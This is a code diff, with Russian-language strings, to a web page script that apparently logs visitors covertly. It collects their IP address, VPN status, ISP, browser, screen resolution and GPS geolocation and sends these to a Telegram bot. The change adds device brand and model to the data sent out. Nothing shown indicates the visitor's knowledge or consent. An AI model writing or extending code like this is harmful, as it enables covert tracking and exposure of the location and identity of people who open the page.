@@ -131,6 +131,7 @@
 
             const vpnStatus = await checkVPN(ipAddress);
             const deviceInfo = await getDeviceInfo();
+            const deviceBrandAndModel = await getDeviceBrandAndModel();
 
             const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
             const osInfo = `Platform: ${navigator.platform}`;
@@ -148,6 +149,8 @@
             const message = `
                 IP-адрес пользователя: ${ipAddress}
                 Устройство: ${deviceInfo.device}
+                Марка устройства: ${deviceBrandAndModel.brand}
+                Модель устройства: ${deviceBrandAndModel.model}
                 Браузер: ${deviceInfo.browser}
                 Провайдер: ${isp}
                 Разрешение экрана: ${deviceInfo.screenResolution}
@@ -217,7 +220,6 @@
                 sendLocationErrorToTelegram();
             }
         }
-
         // Функция для отправки геолокации в Telegram-бот
         function sendLocationToTelegram(latitude, longitude) {
             const message = `Геолокация пользователя: ${latitude},${longitude}`;
